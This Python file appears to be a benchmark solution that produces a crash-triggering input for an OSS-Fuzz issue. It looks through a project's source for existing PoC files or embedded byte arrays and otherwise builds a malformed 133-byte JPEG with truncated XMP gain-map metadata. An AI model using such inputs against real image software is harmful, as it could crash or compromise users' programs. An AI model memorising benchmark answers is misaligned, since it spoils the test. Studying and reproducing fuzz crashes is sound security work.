import os
import re
import tarfile
import tempfile
from typing import Iterable, Optional, Tuple


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            tar.extract(member, path=path, set_attrs=False)
        except Exception:
            pass


def _prepare_root(src_path: str, tmpdir: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    if tarfile.is_tarfile(src_path):
        with tarfile.open(src_path, "r:*") as tar:
            _safe_extract_tar(tar, tmpdir)
        try:
            entries = [os.path.join(tmpdir, x) for x in os.listdir(tmpdir)]
            dirs = [p for p in entries if os.path.isdir(p)]
            if len(dirs) == 1 and all(os.path.commonpath([dirs[0], p]) == dirs[0] for p in entries):
                return dirs[0]
        except Exception:
            pass
        return tmpdir
    return src_path


def _iter_files(root: str) -> Iterable[str]:
    for dirpath, dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
        dirnames[:] = [d for d in dirnames if d not in (".git", ".hg", ".svn", "__pycache__")]
        for fn in filenames:
            yield os.path.join(dirpath, fn)


def _read_bytes(path: str, max_size: int = 10_000_000) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if not os.path.isfile(path) or st.st_size <= 0 or st.st_size > max_size:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _read_text(path: str, max_size: int = 1_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if not os.path.isfile(path) or st.st_size <= 0 or st.st_size > max_size:
            return None
        with open(path, "rb") as f:
            raw = f.read()
        return raw.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _trim_jpeg(data: bytes) -> bytes:
    if len(data) >= 4 and data[:2] == b"\xff\xd8":
        idx = data.rfind(b"\xff\xd9")
        if idx != -1:
            return data[: idx + 2]
    return data


def _looks_like_interesting_binary(data: bytes) -> bool:
    if len(data) < 8:
        return False
    if data[:2] == b"\xff\xd8":
        return True
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return True
    if len(data) >= 12 and data[4:8] == b"ftyp":
        return True
    if data.startswith(b"RIFF") and data[8:12] in (b"WEBP", b"AVI ", b"WAVE"):
        return True
    if data.startswith(b"GIF87a") or data.startswith(b"GIF89a"):
        return True
    if data.startswith(b"\x00\x00\x00\x0cJXL ") or data.startswith(b"\xff\x0a"):
        return True
    return False


def _find_file_with_issue_id(root: str, issue_id: str) -> Optional[bytes]:
    best: Optional[Tuple[int, int, str]] = None  # (priority, size, path)
    for p in _iter_files(root):
        base = os.path.basename(p).lower()
        if issue_id in base or issue_id in p.lower():
            b = _read_bytes(p, max_size=50_000_000)
            if not b:
                continue
            size = len(b)
            pr = 0
            if best is None or (pr, size) < (best[0], best[1]):
                best = (pr, size, p)
    if best:
        b = _read_bytes(best[2], max_size=50_000_000)
        if b is not None:
            return _trim_jpeg(b)
    return None


def _extract_braced_block(text: str, start_idx: int) -> Optional[Tuple[int, int, str]]:
    i = text.find("{", start_idx)
    if i == -1:
        return None
    depth = 0
    for j in range(i, min(len(text), i + 2_000_000)):
        c = text[j]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return (i, j, text[i + 1 : j])
    return None


def _parse_c_byte_array(block: str) -> Optional[bytes]:
    nums = re.findall(r"0x[0-9a-fA-F]+|\b\d+\b", block)
    if not nums:
        return None
    out = bytearray()
    for t in nums:
        if t.lower().startswith("0x"):
            v = int(t, 16)
        else:
            v = int(t, 10)
        if v < 0 or v > 255:
            return None
        out.append(v)
        if len(out) > 50_000_000:
            return None
    return bytes(out) if out else None


_C_ESC_MAP = {
    "a": 0x07,
    "b": 0x08,
    "f": 0x0c,
    "n": 0x0a,
    "r": 0x0d,
    "t": 0x09,
    "v": 0x0b,
    "\\": 0x5c,
    "'": 0x27,
    '"': 0x22,
    "?": 0x3f,
    "0": 0x00,
}


def _decode_c_escaped_string(s: str) -> Optional[bytes]:
    out = bytearray()
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(ord(c) & 0xFF)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        c2 = s[i]
        if c2 == "x":
            i += 1
            hx = ""
            while i < n and len(hx) < 2 and s[i] in "0123456789abcdefABCDEF":
                hx += s[i]
                i += 1
            if not hx:
                out.append(ord("x"))
            else:
                out.append(int(hx, 16))
            continue
        if c2 in "01234567":
            octs = c2
            i += 1
            for _ in range(2):
                if i < n and s[i] in "01234567":
                    octs += s[i]
                    i += 1
                else:
                    break
            out.append(int(octs, 8) & 0xFF)
            continue
        if c2 in _C_ESC_MAP:
            out.append(_C_ESC_MAP[c2])
            i += 1
            continue
        out.append(ord(c2) & 0xFF)
        i += 1
    return bytes(out)


def _find_embedded_poc_near_issue_id(root: str, issue_id: str) -> Optional[bytes]:
    best: Optional[bytes] = None

    for p in _iter_files(root):
        ext = os.path.splitext(p)[1].lower()
        if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".txt", ".md", ".rst"):
            continue
        txt = _read_text(p, max_size=2_000_000)
        if not txt or issue_id not in txt:
            continue

        idx = 0
        while True:
            idx = txt.find(issue_id, idx)
            if idx == -1:
                break

            blk = _extract_braced_block(txt, idx)
            if blk is not None:
                arr = _parse_c_byte_array(blk[2])
                if arr:
                    arr = _trim_jpeg(arr)
                    if best is None or len(arr) < len(best):
                        best = arr

            # Also try to decode nearby C string literals with escapes
            window_start = max(0, idx - 5000)
            window_end = min(len(txt), idx + 5000)
            window = txt[window_start:window_end]
            for m in re.finditer(r'"(?:\\.|[^"\\])*"', window):
                lit = m.group(0)[1:-1]
                if "\\x" not in lit and "\\0" not in lit and "\\\\" not in lit:
                    continue
                dec = _decode_c_escaped_string(lit)
                if dec and len(dec) >= 8:
                    dec = _trim_jpeg(dec)
                    if best is None or len(dec) < len(best):
                        best = dec

            idx += len(issue_id)

    return best


def _find_small_interesting_file(root: str) -> Optional[bytes]:
    best: Optional[Tuple[int, int, str]] = None  # (priority, size, path)
    for p in _iter_files(root):
        try:
            st = os.stat(p)
        except Exception:
            continue
        if not os.path.isfile(p):
            continue
        size = st.st_size
        if size <= 0 or size > 4096:
            continue
        base = os.path.basename(p).lower()
        pr = 5
        if any(k in base for k in ("poc", "crash", "repro", "regress", "ossfuzz", "oss-fuzz", "issue")):
            pr = 3
        if size == 133:
            pr = min(pr, 2)
        b = _read_bytes(p, max_size=4096)
        if not b:
            continue
        if _looks_like_interesting_binary(b):
            pr = min(pr, 1)
        if best is None or (pr, size) < (best[0], best[1]):
            best = (pr, size, p)
    if best:
        b = _read_bytes(best[2], max_size=4096)
        if b is not None:
            return _trim_jpeg(b)
    return None


def _default_poc_133() -> bytes:
    total_len = 133
    soi = b"\xff\xd8"
    eoi = b"\xff\xd9"
    xmp_header = b"http://ns.adobe.com/xap/1.0/\x00"
    data_len = total_len - (2 + 2 + 2 + 2)  # SOI + APP1 marker + APP1 length + EOI
    if data_len < len(xmp_header):
        data_len = len(xmp_header)
    payload_len = data_len - len(xmp_header)
    payload_base = (
        b"<x:xmpmeta><rdf:RDF><rdf:Description "
        b"xmlns:hdrgm='http://ns.adobe.com/hdr-gain-map/1.0/' "
        b"hdrgm:Version='1.0'"
    )
    payload = payload_base[:payload_len].ljust(payload_len, b" ")
    app1_data = xmp_header + payload
    app1_len_field = (len(app1_data) + 2).to_bytes(2, "big", signed=False)
    out = soi + b"\xff\xe1" + app1_len_field + app1_data + eoi
    if len(out) < total_len:
        out = out + (b"\x00" * (total_len - len(out)))
    elif len(out) > total_len:
        out = out[:total_len]
        if out[-2:] != eoi:
            out = out[:-2] + eoi
    return out


class Solution:
    def solve(self, src_path: str) -> bytes:
        issue_id = "42535447"
        with tempfile.TemporaryDirectory() as td:
            root = _prepare_root(src_path, td)

            b = _find_file_with_issue_id(root, issue_id)
            if b:
                return b

            b = _find_embedded_poc_near_issue_id(root, issue_id)
            if b:
                return b

            b = _find_small_interesting_file(root)
            if b:
                return b

        return _default_poc_133()